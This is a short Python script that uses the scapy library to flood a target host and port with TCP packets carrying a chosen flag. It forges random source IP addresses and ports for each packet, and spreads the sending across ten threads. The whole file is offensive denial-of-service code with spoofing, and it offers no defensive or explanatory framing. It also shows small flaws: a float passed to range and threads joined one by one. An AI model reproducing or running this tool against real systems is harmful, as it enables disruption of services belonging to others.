import random
from scapy.all import *
from threading import Thread

def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)

class TCPFlood():
	def __init__(self,dst,port,flag,count):
		self.dst = dst
		self.port = port
		self.flag = flag
		self.count = count

	def ThreadStart(self):
		for i in range(10):
			t = Thread(target=self.Start)
			t.start()

			t.join()

	def Start(self):
		for i in range(int(self.count)/10):
			self.Attack()

	def Attack(self):
		src_ip = SpoofIP()
		src_port = SpoofPort()
		network_layer = IP(src=src_ip, dst=self.dst)
		transport_layer = TCP(sport=int(src_port), dport=int(self.port), flags=str(self.flag))
		send(network_layer / transport_layer, verbose=False)
